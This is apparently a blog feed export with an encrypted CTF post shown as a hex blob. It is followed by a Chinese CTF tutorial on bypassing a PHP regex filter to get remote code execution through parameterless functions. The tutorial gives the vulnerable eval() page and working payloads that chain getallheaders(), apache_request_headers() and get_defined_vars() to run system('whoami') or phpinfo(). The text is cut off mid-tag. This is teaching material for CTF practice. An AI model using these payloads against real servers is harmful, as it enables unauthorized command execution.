4793075622d9d33acbac68a9be32a04314f555f407f140d791620a08f96012362a558bc7273b20d7637297c18d3edd3d6b393196ee208e524a9984588963bd44e79f5728e6100f9da895e8fde2bf50f50de636f9429be9ffbdf476200b7af38f822bf73bab77d200d21450f828f30967c7d59436158d35821b9803ec138be281c04bb203cd8a189a72bada01ff2d7401ac61f92372f08bea0061d2c7d127d8b81ae5e64ca20c0ab3a504ef09a3ed1e9d3ec9729383f655e233b3d4d94be2bbc004e7e14617f6aafc2f7870d57984c3524b050c8e83dac82b0d83b13a162d2669bd6c2efc3b79c5de83c509c1d0a2df40217a61ebf3b6dfcc5cff00d3fd26edf26099d7828ea755d295617ea9d5b85973cbb93cef90d665a27602f4471c16faf045e583fbb8c31afa3c81d6182b04957c1d0463cd9d91fc893c3f7730eccf73f3bfa341acd36edeecf46b6051d62c4067ab5b166bb510bc52a201a36a1b852a55024693528beb6dd3e40a624cc6ea6a1d3d0bd9a10866943959dee7b081e16d45ee7360cf6edd648da2d9d6605fdcfb08368404da17b2dcd5cfc5cf55ad8ea1b66198e1f257321e740a3287265f5feac675d9a03ac0e61f65536f172963d82f7279a9c7e9244fb7a39abdaa7fbfcda499dae37d2d732357d82694750be8c2e118145bffb6b48e1a73c1a2e34ab89ffc9fc5894dd571acfcc337ca5e2b5b323dcfc6c472323a9969d9e67f937728da7bef97be02fa068d5227172d6fc30a39342681bc7bfad80c6515166ac0d1fc48e1b40ed863624aa04b8a46a8d7cd0bca289c3be4773b87bf0780a6d849b5da842f3cc05cfdeaf379553eb28f8922cf6118b1a9406ac0cf0b5e8c7a82929b6d750a3670792b0a46c1fdfec7371dc39680940b33ce23b16a9760ba4569eb08739b9660e8db6653efb3a0c11be19f9b939b6b06dde91a2def18a6ee35f1734a179243135eb6f6bcbad843d4de927a1d98e710a1e0c9b36e13eb3d4bc08d7d986d7232f8a2f6608b933963c283b472aa2b2955046228455bab4be9c6312bcdf73c32212488d7fddf75876e6b6ef1c19997014eb9a262e8ae2a579833c8a2d65617106769790a50dfea66487745fcb23f029c9e1d2ec31a8dd1d7834077bb757e3f07a6119c4c7bc062622d1c7054f0dca5d82ad4b543de73521276f6c927fb5bf30bed983ff1da1cde56cf95a4f2ac5bc6619badb02de017526ac66060a6c8a820b22e04cdd4e23f44d942461c2230edd5d51c6cdc80288fe0f4eddc2c85a34a3c32c896c7ae51b865704e36b1b42263072209fbf8db80ad48dc983949a16f09ffdeb2eb5d95e51540ae636810c35225971a5959a992a8a4312a76b7e93f63a868bedfbb605b840edbab3bda1417fbfba242ef311182e5bfb0c035198a4bd0091e0d984f6752da34e9e9cc78fb94cc8d3eac01cc1e10bcfcbe3ec6fb967ed534cac5a2cda4b48f64fe1aeb78ba1f99cd2a950b2a9dd8300f668b424d14167cc1a643601acfc13d57fb540ab095ab91d8feeb0779292c22670c176f41206370d7a12e0fcb0c286140f89484f53e35b8901c996e4bd142aff48c1c57d2f42df64144b399a21e8f7d7e420f27a144adaccefaacc68b6cd0c7f9b0bea64e8d5babe2e0be71941dad88f61b65efcd154bd7e0ed1ebfc3e16b001e2e7f58f38cb211b71ad3d9a43d1adb6254399bab4163a057d2ba73e80ae48495d0d6489484a56e876665b6f9b4017006f6e40bb3b417c7be28ebc4ac61099aac856783a20d06baa3b3045673afb458e3cb91d4c1bda19cdee8a0e16269e4206759a212fdb1947f707a27601ad48b33d211e26df7908a2d90b5a36f09634bb7dd0098ea756fe4e302c29844fa74f3d36e9635f31f4fd0771ce86d762f8bb56da67cb0e7ae37420a5e654dd07588cb2bba9cc3d8511ff827769ceea575cc7ab1d59d70f670849d93557f1dd4747b312a60b7f5e16b02fbe4a22cfecfbee2b4278b41a9086bc6fde67f2ed4f33caf04f56a1f3af49754e177033ab62ac4f7a810f954196448d4eaff740da64de5303965bf65f42ac1c43e805b2c01228025a944dac58c8bca289766a268221526a83963bc3244ae83776869260e61a11c638677b9e6f6890dfca91f24cd087d2aa751b175299c30fd0eb9114b82584ce0163ce99753f5ae1a7375259ca8a163570f93cc49f1041e0f480222b450ee9bfe8f73115b8a702ba5638f411c7b8b32d30784ed702a876ea6b06f5434a432df50d1686485d75d1880588ab52a0ef673baa5be96100009b5bae75140f96145861a58b55dba6eada52c201395bc7de3b77f641697ac8376f378592c653d1ec0ed85a85a3dcc3489931c73978180b857fd9838c0bdc1fcac6b28b2533fc86d2176645296057d1e6a2c2bbc5d3a0226a438d62750ac9db7f9609dd74b986daef44cb77683f63cdd9935abeee744d7839123a7fc321e332525b33cd8a47a436c0e30ef5d625af3b01e38d1a0eaea29bdac02155f005ff22e47f2e18efcdfd77f672cacbd8b97eac83cd7267deda09c1df7065c232fb1e228c030469effe414df209965b7864b416aa077474ba6ff1a4ff5206d884ce32011a06cfc85e66223ba0dc4aa8c39b6e5f6adf875aef77beb240ecf509f35b851bb7d3d6fa8e24516f1967ea07013da6215b16b167f9915ae7bb9c64e5b59334487bc1e34b983c60a24b86d1e31b99bcfdb61541c6b48e1e36ac030dfa156098ab34c4b56e5ed9dc8a8572b108f57c20c014c8ccebae6c1f3a7a2eed843baed0bce865b5f33879bbae89345c8a470bd8ed5a3725faae6353d1e5d7158e744069f2553b10b1c39f8b884890de761b0fe20b6634f7eb41ecde41463204661bbbe302a095c702f09b23de10dfb2c3bc3ecb2abdcef8281683fef6636e2d197f329a53e31e7e3619a6c998b499b99afcb9018f4cd96f7e139774e699f4263bbd22861b159e49598bd7df397522aa16505400b95efddbc5e9156479430c2017c673cf30ad5bc4d726042c24cd75cf7bc8c3ab0081628b7f077be4686542832850e8023984ac1b1898a438b6dbd5c84e4edf7e9aaf72c17198d81114851386726016676482e6bf5e4dc0eca4c604bc0782c6cefa7f454e27b3fd65a5ee59c9ff0296b931f29fbf93cda4a16f6416f69536488a59d9f4cb4c1a64672d6f316803d20b13bb976a567efd2b1b4a9e05d3f7c623fb27f0dfdc6f71381f5f8f888238c30093dd2087144a63709cfb07d8be81fd945a1d26c331f3491cac7906659b71b64b1f46d12fa753ff11fac01c5bc702a839efe07b898412c3f545e7f46a72ee53fb603d5c5eab1e95992dd32056284f5206e8a72df2dccdaa835579b01a8f7f59ab4e515cdcfa9f2df0a3de29ece89688dd1c23e68c26665da0a3a425e67e77cbc99eed8b3833a707151dfb2c454cdaceb563c67a8f8556e11702bb242c5edc7cdd21d6bbf1e8bf13e809fa274bc8acf1c5dead46b079f8d7158053d18ea168c1ec34364ec68268715a2a2bdd686d6a4ba2c3476abbd8bc3ddca14970beeac74a96ca997e53e77556e63dcf7e687b232bb17a6f1c82673df034e9a9a6658aee76d716ca90755a881915597ce25bf967b8fb031a457326ef613a1da3cd5b82ac328c4f966032202b76ed69b48ce5035dc295ac8e0396ac14d0c38ebf6325e94d7f57927807e9634eb378db7f6e5df44862a65b71dfb00c523bdabfdbe6d4719f77dec090f544190406cd5a196f7eaec621d99a08972f75a21d1783e0a322cb909512b91735b731d13ff28f2582a69085206f4f64102aaafc3bfe4d8ee17fc001570f3e4e22ab076f57082a2a0b46ebc1cbb3b20d73aa69338359b13d1df6e91b0e25f73c2e50ae893c14077cbba0a6dc0676eb6998123950397eb9099d4cd04a65c92a32ba83d6fe35d07333e99085df3135b8d592df0d6a02a0a4100ee6664febc159fa8eb445a00391548b98024e942c1efe84cfc82b207f3f228d8f02cac1d2d5de46396b762bc188994279f64b1ec52f54490b3e2d92ea5bd2334b2beb76dc305a70a2a6c0df5e7fc61a3eb3fbc3d51a5f05906d5096aacb3b20a44965dc5866a959834708f929b85c6cad9704ff7864b9cbf518310aa3b4bae2217be6a7572e23379b29e317aa92b3be7f159f94ed856f9108fffd598613262e07b1f40248f0f8e9b4872737a73dcdaf594ff57e2e9e29cdd8da3b4982272f2d145a6c8f5f28bbc9525d65027bb259945a315bd9ef88985b17175b7e42b0b68ce634b3b06ed600ed7b83534d4b98d235a25b88b5c2015fbee9960697801c00c652d22b3d8ff243a3b754e87d9802487192688fef4217c32ad31f914ad607372bb7d6473070fdb9c26d2279ac9cbcd47349d8bdf01b1651171e378496c4db978c354e55076b3de757678fb6c8ebfa10e3583c13310d84ed979d533c1a2a863a4e2081b01e298d84154f2cc83c12aef5a2cf86c480958f7a92ba93c174c1a79160319a8acbe87c400934afae7dbb3314b64ff3c035a9eddb320d9e05818dd076f21b749745b3c8cc8a750f4e2056ff822900f047180d7d23bba43e777fa7e65a4642b1946cb63a406a5b8d66cd9d0ab5e08a276f500b7ca30f0e119aba355efd142c66ecc9a3afb27e35e655d69b469f61149f00a091e972ef86338a1b7ce021421401956c504c6dfd263ed6a80de011e8e291b33c891d90c4d6a2a45a80082900914a4be40a709ecf4ef7e1573afd6a212a7b6aadca207af96c316f3262f87d0f0198bc5d216c5e9c0258877319d9806616e050bdbd39ad47c1d335627c426512462d7181cd8c65243eb91b5f26d91add29174f5d4bcf643ac25b3906ceb45e4d1b0895defd73369a6d99231394348de0f13721399725c433e8ebc79675e7e524fab4b28d418eea023895d2d33130121b5b301a38e17c0ba671023d8a88254407e5534cf2c8ea4dd14027c5ac3c828e5f9e8fe571a94b19633281ab3da22a0e8d27d4aa9af40e93e9183a7e8b782ab10fee9a59107172062ed9b52de520922a159644a311c30ccf452416dd36314cf4a81cdce6c07946bcd35b18e2e6308960ec6cf5c0e1f1adcbe18542b2e4d62db07f750c4f7e5c246d689a1630edcae96b9ed4d244b784dac41a0c89236ab676052821893500211a9401e3854ef9b68ed74d654de05ba01c5f4fc51a17e084f85e99e124cd3b89f6457d785949ff0c41ef3ebcca1fdff0f2db643311eb97ec19dbaaf78665083043d3a5ed96d3a1d6269a36e436fe50cfa355a9cc9ee5d02e769c0494137affcdbd0a476f1286b4c15c3c49768b2ae62bd2138bca74a0eab7ac31c08b4d9be34d328584d32f349064129b085ea9d6c266a1f5d3615094b98399f2b4d590dbf12f79b9a3c5a74b5f185454a6f207779fa6bfb207d25c767a9bc741ed60637a8d2a80e56cda10aef2132ed44bc77c663f0dc15efe1151fbb1e2496f00c68dfa504e1377cfe5972bbc4ecfeceb3cd563f2e698ad7fcd14f4c6c7a55f50c692aa0eb78ad3ee3ea4647b172c5fda5cb265a0a592782c913e7d36cc14437483124baed65f746a0b6a51dda45029c5e1e935e8b9001d9100704a301045281c9f52d7c774d153c9cd5694b1cd9e458f302037ab01bee0c46018d0fa5f3ce51cfe4e056b0b9caaca3ec5e1b8d3abacec1615dd5e6e391032b570f7261f6ded1df3358c439c8cb9e47d87d6981c4aa9b8a6e6be7dc596578b2417a0081a5be636934214be6b78ff911a2749814e4e9fdb66ecd42af6d596b47e37871e289bc68f210d2bf00f0b56554d2ebfa739312a11c472075a38bcf40a3842033d323be46eed49dbd7eaa0e5e3a5d2ab953d62b6e0174126b54fd6d707cbefcd202e7f5f74713f7a72f38b21e992e99d5389e15ddbf1eba78e0cb73fb17812774c6d37db7cca2cedb97df9959ab873836b4da50acd34e8d1833220899403ab5744f006abcbba382ceb8d09290c083d2186bebe4f6361c2c638d4a52c8ed586b7f76aa1a0cc6ce19ab04c19007b6ff74e80da0857a5954c91b09c1b687891324adccee07473ab5348e2c5d561eb4ecb709ec4f9d786b462b518fa0e63530c0a2145fb673649b3ee3bc5d6ea4dcc962d7d456ab537cd68daead001d17de120d9a6d80a7ba21dcfe3cdca667f4c65c2b45315431e7e41db8f9387b275be1ea67a967f60ea7f1ec30972bc92da043e11c7d2e56b45e0043b16d2ef1dd0f6c729c479fe2fc7c1406e854abfe763ab5e672c6fd8b9485bc614d97b26df20bd98c2e35324f76048f9341aa05671b28b8392d80f825289e429a39f6c703f72f9945631daf16238abc3d7615d804f5a725ba55b6f4569c88b86c6d54bd274ec242a5dfdee21c2c8d6857e14aed55539a8c5bb001e54965e397abecb79b517c3f49f3854d5af8cc829c4b168a5a009ac071dc912a2cb4a08c13cee4cbf3c78a665897a85e33453ec1647a9895b6b798e59598efe8a8c52d9ad993cf082f189fe367ef5dc033d5b0a3480c22b201c7cb93c81595b6b0859a9dd88010ed6aba31600db40743bef3f190e0d946f95a1110d28a0104d157f867b4b4d9174bbcb555067b6ef008bfc5d4f4c25755de17c74de3272a0df83491c4b952fdb5dae07c103e96157b66f93cf0b278fcc52ef5abb1fc697f9bb48c408e0d18c4f815722c375464fedbbd6cf5fb3a97e8ad0561ec6eeec5eb2e3a77cb75c5261d7e00712caef5440fd86cec333a052b5fad2c55a0114739760613dc6d0ed4cf50d6db866e87116c29d1c61cf1cad705f03c30cc58eed9c0054a3f646862f4d30c671d99a411dab8b8a991974775cfb3d49f0bb03ead66350fd8aa586588d79bd128be74f5c9dcb29473f6fdcc340cb3bfef28c207d43fa5102d90482d768d7b4cf8896b8dd49a7fa6f7984c1d0196cfea95e09c9058d75af9ce1ce16bb39dcf3ede4d6ab644128e4368ac2d44f3e4ab00896e817f1627c496c95ad2f7b6bfdb82181bd988f00a9d3eea765546767b6b935ffd1dd1917697453c525a18025f9179ec12a037f7211dcc595befbb7af5f35135f63ad100c20dca51780ff64e59485f8ea18f4573b5cd3639c9d9b8cd98a4589c33ce31e4df8ecd85944868bd3872474cf61411c6cab220a06db7962ce8ff6c8cd8d4a74d68354509f1e011441f239ae8f31f7d25d6fae45c8509e50699ef1ec315b96cb83c720e105ceeb309aaca2e90f7441da3476b72183fb8318380c79b5a665bbf232138db950833df492b039d52450cbaf1d629285b5a9c8e96961b438e77c900b21c1581267563b8b5a5d1db44dd392e82b190585cc8fec0c9f8f5489468e1b56cff454ede5cf74084b91012ef6b2d925e542133430d6ab29406978248ce9ad0ee8ed082e78230f23a81382f4f824d2acd3dc3451abf1baba139e2b6c75f44bd86f71ec232b5071d1d4cd220c74294a42427e574b3d5cebab85c782cc79a47561d85bc1fd1c7d3b19b1cf505639efec8ae76466b16c60bfda7209091d9951abc017d924b21bca51086e1fbac5f0cad3b761aabb730c8e04de712299e45053606c089393220f4a7d9b55870fd33b156130bd0859656b9022ffa44f3fee387406bf72393c3a1a434c6a4c9d9d3b6ebb4175fcadb2bb03221ccef97df827b308edae84023abf20608f6b21c6bb25c3138bd697d5957a96ccc70a78e055011ea1fb1d92f7302c605a9dbe3c854a849c8ba99dd1191f7b92270019cd3633be6f9152215ac91f1aec712e14c24b5bc7bd63dd165d44133d5c59a6369592bc4c0a84a2cb0b0da85d387a11543dbf98fd89a9b29b798501f3acbf1c63698bed33980e6cf609e603b2dadc962c5f6044730ea2279b797f486378c5dc636b342062840f945da8d1469107fc3b71427da39bdfb3b85a6434ae33a39baf31e8bc339a82eeedb5018f4d976cb2db8e6e74dfa842e4a49c13684ad9f5c04fc4b6c90760d83e651388e0a0b83ee0a73d9cd5d747025a78b0564e52d19dc3153413bab9f19b46e39b5b6dac1606d26eb198dd3b7299d83e918d695590cdbdd70d541e5cad669a6cc773005fae532746c9e664b06a6c284a5bf64a02e8997a4b035697e7dad8292a56ff85d13fddbb3376c5abf0d9eb3672d21dedfe4aa071e619fa5b6466d7927be0de796df29db1b173a1e85c9e9c129977ac71e5afb05dfc0171d754c8f233929241a3abd62bdb0e65253db1da2e90acc56f2d24a71678f3c2caa88ba93b0d892712baab5ff0569fe3a2b177fdd7c4ee561b16ace24f30dbfd4a6a164010e56465112415a67ea759ecf47139f58662453342abe75660f3b9578a00f97bb09708555ad4799ccc1a6779b5df74cfc5fd8a25cde878449851028ce8e2510754a00bf037f03db754fcf32e5ce8368a91dca8a020cdc5c906c63f23f4efefec13bd0351f7467a80c7c11b3db1e648ec6c06152c01f02606f6cf041269fdbbe9a41fc87abe1fb9cdff24689ef80c1473e592ba326b18ff9f23881c0d5fd7f8d802d54ce275555d47d62793b96a6ff3be1845395eb1e3d14b7b355fe1b750d85059cc266db25edabb4aec6b6ee91bdff63702f31dfb6271917a41f25c4537ddba67dfed89d889d85ad75f24b62aa826fe7756e654ebe5c84623bc9cb0dbc6446d85ffd2f2b03d6ed28be0f817f2be59c1ddd823bcf6ca064b29d37041ffeaa242aa510fd347d9a430eca402a47c70213742c80795488a670d0abef4b8db2946330a44e0481c75cb953bc9797c5cc2d6ef777c2bfbf953939509aca6d34b1fb441e3e20f3334ddfb9bc2d271bd0f90f430754670c802bfd218d1990a013154f8a95824e83009337c450595fadcd8aa46729dd089fee7cf715136cdffe2c14d6489194d7244241cfe1498dee5a2c14b0597875a003eaab13fa661761d5a69f16e0582a0f8dec84b228c41a6a41509b9c05460a6a612dd83a4033ff5fb24c9f7b44edb9b4e3fb41d8457462508597549615d468dd9e700ff94d39b582e73ce8db0762d10ef0c4a778254e1bf1f5415f3b7234d8386ac0ac2282447f92228801ab32c50ea30fded9e5fa36c54b290d2b66134720797144340283d0bf8259141dca0fbc2c645c89fc703cd221ceaef449633a96607280a362527f0c69185781e1ec77519612e3c221fa7c70fe696fbd565051e1ce2d40356b03ec44759a6f6fbf09028bc192e2dcacb4ae642f2c6f5e0b0b08d8cc645ab91b0c7dcef13ae10b3e1e10085603e348b89730c5246f9f6062796bd2ea6fffd637cdb37e84b8fce8f42aeea61cef0aa1a093eec12a76c3e8b29fcf26de403019f1221d8c9716f756dbebf9cd718dcd85077995a52259435f82ed05117dc4f24668814fc46d81764b23dc6e4b8909be3fdf4a512a4a6e31c4e76cb710af7a2fe45e8991a3478e73db219773c7c72096fbf20aaddbba21a47e4d3ac3194d08ff099ad40952b69356e720e006d4e697edc3ce74a153d4271c63d5d6b543577e844a47b1f98747236362b74f260a4c1f1d0ca6dd22567b767f3f73861882283d7b2ae3fb7b12951dfd47dc02cfba7b17da8e1774d95c66061e34ffb787763463c463d13995e8b6940baef66bd01c860c895ba245a3255191fb4b175c1779c51c684660b454729006a5ce29debd9850abbb1855167fe00c5c84eeeefcf874edfd510e54b3b28e29b0b56fc4ce4dffd45b233a1d6543604397d56f35cdf164040896416af95410d6c877ccec0bbe57ac53e2d5e59e4d345c9ab93cc34b4ffe8fb1691c273e33c913bfbc3b9bdc1ec32d36f7e28fcd9ec23c3dadafb3d9b562453396199d6307cce6febad73110a8d9393dad5e7a5beca6173636e75b17aa79daf5b1a8f4357af922a69a4857c1974ce2b76b047821969a9c4c5be2ebb333bedb06d951eef29b103377fb15853d95d014c5ca60322d5ffb26bb76ad075a935febeaac588bbde32431c98557ce1d5006fc9f9e765cca52c72472096963945026e4ddb3755fd66c6bcd1d4e327b91c804e54579ef9930e143914e1369348628ea32d868e5f662188ed0ec6d2b05d8862a0ed2e0d36fb53c325cf678444b0d710d9aecee1e1b6154b2ddaab2e394c334bb4d167493e2d7c9fbbceab230357c17a04eb8a2260c1af28945c2ded5b67df503cb36aa964865f2a42e8462ba426bd744d55a511ef5cd3a46a856d0fe375b186b93406c36e62192eaa646627ddb8aff7a30d8259b7069fdcc45577e2e4758af805aaf62342ddd70f05c98b624c1ff09447e9b1b47af6d3162c3af3be2c782b6280c4c4406b3ee0e46b045e97eaaa82453072c916355d240df7afe0899a0c843f508d7c7ba695b88ee124a6505fd9976e04288d654926a6829bc65482dd5a9f897d43b873fc4f0fcddd660d150f97ed0874e6c896fe8c83ae27d27753da6c340d4af45ff227e06c0981e75c2a4d9c71822813d878f4a3529225da0588e4df77b5ba909d56ff316b9d8028b038cb7a99668d2d97512b85119c2cba9d350f4a4787198fa8fd0695d50e913ec7170fc344fb6a324e7e8a8d6a2eed286df1451eb1bf6c1b245fd1b71592139b0b225fd703bc952d79daa95b9dfc7d61b0f2edd757c3b64ecbfbf5056edd2547782660b3292d5dfcb65f6f921e9aea080a45c400505fdf7378ad420c79a5c657c063c694b71a1678f78d1ed361fbc7a3d157b132264d2a17576cb8fc7c6597e7688c870b2498362adefb65ef9037a4f31e44c07174e624954f99fb8464db7a2f2319977e60f217dffa8b453646e433bdf7879bf666e0623820f5e8ef01e81ca14e2bda8cb55a8553d70f03cf865a7b026724716b943f077b508016b37878f7d8e4cf5b25dfad06f219223fa6a1d2cd9ef3900245dc168a3601a6fcde3bbdf34fae75f883ca9841881aa56f87fabc451642a4775d62adb47e88188f0226d2102899637fce299594f401586c4d0c2b63178fe78b39160cfa30342863d96c85e7a7b84be0757aac6b107d7ef19a6c40d1e87b27f46734acdac3aa40dbb10bf50ae63e4a992fb64929ab2277d8d6e18c52d4aaa8a930589e30e9b39498dede04a12b8c75921c5f31ddf02f5d4b611bd591f9292714c8eb683d5fa656a5602135a9d21cea177bb76b3c604670c9818249d92036b4572d13b6ed069a2cc6f2c1d093a112cda2950247d838f9f08220f5f42f1ecb7d2ab7c0b087c460334cdd77bf8226483cebcff03e837e87b290250d807691948fd838c891720025fb90deb375dea625e3c88e7f9278ad7aaf1a81cb89cc47ffdab88a1c326b93b6f0df9f087340fe8ee6d7f4efa9311eb86c345bc972c26b6d03f1cebafd47c4aea3d612e9658940a96f2e0370af498d6d1071248e3f4f5fcdaca49d168b487f67a7eb97519453d2b1345b48f9962880dd7ac9874fcef1c144c66520e69c403b7919dbf29a92ba1add7cac8cf18e08e4cb159d6ee6773590f982706c2a874c87e224bf5266216242dc70647dd1b1444aeaefce9c064f5b2b3cd4bf89e0cddf48e3ec7a4477299f7904bec1ad5b1a4dd0bc0505ded926d2bf5bb8b8b211cbee75c31d1e4f30bd4c75b809adb20df3839ede1870e1df5fe0ad960e2f8f50ff81ef813b43db67858ae82b7f8c7b862fa0dea656afe747f99e1aa33335b1154b3d3c5ae6c7c2977c19a1ca23061b3f6d58a7c9d1447c08a2bf61c805736285d64127321bed70fb3cb068235fa507e9b2f66f1213782981180a6419df7e0772dded20a12928ced038cab6c32822f0387dedf118a2efacc797e1490cb3158d18db98bfc0ff34d503a71f21dbcd8cce32350a5b1a3420b46e8cb06dfab02d00043793073e4e4c1b41b866cd2eb1ea1930785bd956f8c3f17ba657618ebb0b55b7ce079cfeed286ef284153fa9a2d9573b84153a7beeff5dabe4197879ae6b384d4ca420c7c7baf38caa8a574eefca7caba10674f692313108fcc1cc75c15772b2af8e302a2395fc5fb144957c66ddfee5962e90069d9e5ab664e364178dd9ebd48c56a5c0e8300ece89f7e8942d64d349ebd2d256d85895bfd7ccec0e5b3a92b505d09a69e4e3b68af0fe3f4c64d4868eed07319481fd3e66f7838af252d4c2be742c9311a19e861b943d8a958dd8b8b7d330d1f7e87d88ad145550908e7ad39fa877a06988f7896b26c7495ff4e8e8c2df995db8d1b573a2f4845dc3e7670fc953126577e830680529c7699099c993ef5e9c830ab94ab40ebf210af0467979c527e4169922afbfb3658781b69e2bd03909273bf42eb97b35eaf46e5712c6bfb8dca889bfbc5a9150279dfa3449254854d24f057010fdf6d6e5b40832fca929ab000333354cc354c96e09780d9541509c6f3d25ff849e7999715f72249ab6980b476e3fc45f93175cc368abdc24af68a604eb577a3a76eaa24b4258f07a38e0bacb96f418ade7da128e98cee6840567db80462b9821eb699651683c7b53afcac8862675d91eb952f1e834f152aa8206eedb1262ac6cf016dc3e506c67a7daf194f2b785da7b927b4f477c81c681dfedd187c831622ebe98668a03728dc70edccadd87a62f6f6e4d90</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参数rec</title>
      <link href="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
      <url>/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code class="php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>这里使用preg<em>replace替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9</em>]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;<br>以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><pre><code class="php">目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。array_reverse() 函数返回翻转顺序的数组。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件    编码chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。</code></pre><h1 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h1><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>**getenv():**获取环境变量的值(在PHP7.1之后可以不给予参数)</p><p>适用于：php7以上的版本</p><p>php7.0以下版本返回bool(false)</p><pre><code>?code=var_dump(getenv());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235047746.png" alt="image-20220410235047746"></p><p>php7.0以上版本</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235228226.png" alt="image-20220410235228226"></p><p>还可以通过这个打开phpinfo()页面</p><pre><code>?code=var_dump(getenv(phpinfo()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235551070.png" alt="image-20220410235551070"></p><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>**getallheaders:**获取所有 HTTP 请求标头，是apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用</p><pre><code>?code=print_r(getallheaders());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235935581.png" alt="image-20220410235935581"></p><p><strong>payload1</strong></p><pre><code>?code=eval(reset(getallheaders()));# post中增加请求头flag: system(&#39;whoami&#39;);</code></pre><p>在我的burp中经过测试，设置的请求头跑到了最前面，这个问题我也很奇怪，网上流传的是取最后一个头，那我这里就取第一个吧。</p><p>测试一下，在这里添加请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000647293.png" alt="image-20220411000647293"></p><p>输出一下第一个请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000715021.png" alt="image-20220411000715021"></p><p>我们发现我们构造的请求头在最开始，那么我们就可以构造出payload。其实在开头还是结尾，问题都不大，灵活变通即可。</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001023643.png" alt="image-20220411001023643"></p><p><strong>payload2</strong></p><p>在php7以上的版本使用</p><pre><code>?code=eval(end(apache_request_headers()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001253812.png" alt="image-20220411001253812"></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p><strong>get_defined_vars():</strong></p><pre><code>返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;files</code></pre><p><strong>current:</strong></p><pre><code>返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值</code></pre><p><strong>payload1</strong></p><pre><code>?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001923627.png" alt="image-20220411001923627"></p><p><strong>payload2</strong></p><pre><code>?flag=system(&#39;whoami&#39;);&amp;code=eval(reset(current(get_defined_vars())));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002114740.png" alt="image-20220411002114740"></p><p><strong>payload3</strong></p><pre><code>?flag=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></pre><p><strong>pos函数:</strong></p><pre><code>pos()是PHP中的内置函数，用于返回内部指针当前指向的数组中元素的值。返回值后，pos()函数不会递增或递减内部指针。</code></pre><p>解释下这个payload</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002640375.png" alt="image-20220411002640375"></p><p>我们发现flag的值是被嵌套在两个数组中，因此如果要取出flag的值，要执行两次pos</p><p>第一次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002803950.png" 